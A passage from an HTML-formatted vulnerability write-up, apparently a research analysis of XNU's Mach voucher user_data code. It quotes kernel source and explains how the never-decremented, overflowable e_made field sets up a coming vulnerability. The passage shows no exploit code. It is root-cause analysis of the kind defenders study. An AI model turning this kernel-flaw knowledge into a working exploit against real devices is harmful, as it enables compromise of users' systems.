 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made</span><span class="BGLtzooHlW-c2">++;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; user_data_unlock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">NULL </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;alloc</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">alloc</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(*</span><span class="BGLtzooHlW-c4">alloc</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;elem</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">NULL </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;alloc</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; user_data_unlock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alloc </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">user_data_element_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">kalloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(*</span><span class="BGLtzooHlW-c4">alloc</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">+</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alloc</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_made </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alloc</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alloc</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_sum </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;sum</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; alloc</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_hash </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;hash</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">alloc</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">e_data</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">goto</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">retry</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; queue_enter</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">user_data_bucket</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">hash</span><span class="BGLtzooHlW-c2">],</span><span class="BGLtzooHlW-c4">&nbsp;alloc</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;user_data_element_t</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;e_hash_link</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; user_data_unlock</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;alloc</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;attributes are just uniquified buffer pointers. Each buffer is represented by a </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span class="BGLtzooHlW-c10">&nbsp;structure, which has a meta-data header followed by a variable-sized inline buffer containing the arbitrary byte data:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.3f4fc041af984f11d98fc5aca7a145c07ded181d"></a><a id="t.29"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;user_data_value_element </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_reference_t &nbsp; &nbsp; e_made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_size_t &nbsp; &nbsp; &nbsp; &nbsp;e_size</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;e_sum</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;e_hash</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; queue_chain_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e_hash_link</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; uint8_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; e_data</span><span class="BGLtzooHlW-c2">[];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Pointers to those elements are stored in the </span><span class="BGLtzooHlW-c11">user_data_bucket</span><span class="BGLtzooHlW-c10">&nbsp;hash table.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">user_data_dedup</span><span>&nbsp;searches the </span><span class="BGLtzooHlW-c11">user_data_bucket</span><span>&nbsp;hash table to see if a matching </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;already exists. If not, it allocates one and adds it to the hash table. Note that it&#39;s not allowed to hold locks while calling </span><span class="BGLtzooHlW-c11">kalloc()</span><span>&nbsp;so the code first has to drop the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;lock, allocate a </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;then take the lock again and check the hash table a second time to ensure that another thread didn&#39;t also allocate and insert a matching </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span class="BGLtzooHlW-c10">&nbsp;while the lock was dropped.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field of </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span class="BGLtzooHlW-c10">&nbsp;is critical to the vulnerability we&#39;re eventually going to discuss, so let&#39;s examine its use here.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>If a new </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;is created its </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field is initialized to 1. If an existing </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;is found which matches the requested content buffer the </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field is incremented before a pointer to that </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;is returned. Redeeming a </span><span class="BGLtzooHlW-c11">user_data_value_element</span><span>&nbsp;(via the </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_REDEEM</span><span>&nbsp;command) also just increments the </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;of the element being redeemed before returning it. The type of the </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;field is </span><span class="BGLtzooHlW-c11">mach_voucher_attr_value_reference_t</span><span class="BGLtzooHlW-c10">&nbsp;so it&#39;s tempting to believe that this field is a reference count. The reality is more subtle than that though.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The first hint that </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;isn&#39;t exactly a reference count is that if you search for </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;in XNU you&#39;ll notice that it&#39;s never decremented. There are also no places where a pointer to that structure is cast to another type which treats the first dword as a reference count. </span><span class="BGLtzooHlW-c11">e_made</span><span>&nbsp;can only ever go up (well technically there&#39;s also nothing stopping it overflowing so it can also go down 1 in every 2</span><span class="BGLtzooHlW-c28">32</span><span class="BGLtzooHlW-c10">&nbsp;increments...)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s go back up the stack to the caller of </span><span class="BGLtzooHlW-c11">user_data_get_value</span><span>, </span><span class="BGLtzooHlW-c11">ipc_replace_voucher_value</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>The next part is again code for unused functionality. No current voucher attr type implementations return a </span><span class="BGLtzooHlW-c11">new_value_voucher</span><span class="BGLtzooHlW-c10">&nbsp;so this condition is never true:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.4f6b8727516fb3c9c48ebff520ad8874f31f22d6"></a><a id="t.30"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* TODO: value insertion from returned voucher */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IV_NULL </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;new_value_voucher</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iv_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">new_value_voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Next, the code needs to wrap </span><span class="BGLtzooHlW-c11">new_value</span><span>&nbsp;in an </span><span class="BGLtzooHlW-c11">ivace_entry</span><span>&nbsp;and determine the index of that </span><span class="BGLtzooHlW-c11">ivace_entry</span><span>&nbsp;in the controller&#39;s table of values. This is done by </span><span class="BGLtzooHlW-c11">ivace_reference_by_value</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.c4c5981b6f20ec9de21a50072140d8a412c4cbbe"></a><a id="t.31"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Find or create a slot in the table associated</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* with this attribute value. &nbsp;The ivac reference</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* is transferred to a new value, or consumed if</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* we find a matching existing value.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; val_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace_reference_by_value</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;new_value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;new_flag</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_set</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key_index</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;val_index</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.14867f48cf979ee62c6fdccbefa3859e7dda3ebe"></a><a id="t.32"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;* Look up the values for a given &lt;key, index&gt; pair.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;* Consumes a reference on the passed voucher control.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;* Either it is donated to a newly-created value cache</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;* or it is released (if we piggy back on an existing</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;* value cache entry).</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;iv_index_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ivace_reference_by_value</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_attr_control_t &nbsp; &nbsp; &nbsp;ivac</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_t &nbsp; &nbsp; &nbsp; &nbsp;value</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_flags_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;flag</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_entry_t ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;IVACE_NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t hash_index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IVAC_NULL </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;IV_UNUSED_VALINDEX</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_lock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">restart</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; hash_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;IV_HASH_VAL</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_init_table_size</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;value</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">hash_index</span><span class="BGLtzooHlW-c2">].</span><span class="BGLtzooHlW-c4">ivace_index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">while</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">index </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;IV_HASH_END</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">index </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(!</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_free</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
